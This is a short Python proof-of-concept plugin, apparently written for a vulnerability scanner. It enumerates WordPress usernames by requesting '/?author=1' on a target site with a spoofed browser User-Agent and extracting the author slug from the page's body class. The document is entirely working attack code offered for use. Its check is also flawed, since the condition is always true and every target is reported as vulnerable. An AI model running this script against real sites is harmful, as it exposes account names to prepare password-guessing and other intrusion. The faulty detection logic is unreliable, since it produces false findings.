# Author:Joe
# Name:用户名

import HackRequests
import re

def poc(arg, **kwargs):
    hack = HackRequests.hackRequests()
    headers = {
        "User-Agent": "Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
    }
    payload = "/?author=1"
    vulnurl = arg + payload
    hh = hack.http(vulnurl, headers=headers)
    p = re.compile(r'<body class="archive author author-(.+?) author-')
    uses = p.findall(hh.text())
    if uses!= None:
        result = {
            "name": "wordpress_get_users插件名称",  # 插件名称
            "content": "获得用户名",  # 插件返回内容详情，会造成什么后果。
            "url": arg,  # 漏洞存在url
            "tag": "wordpress_get_users洞标签"  # 漏洞标签
        }
    return result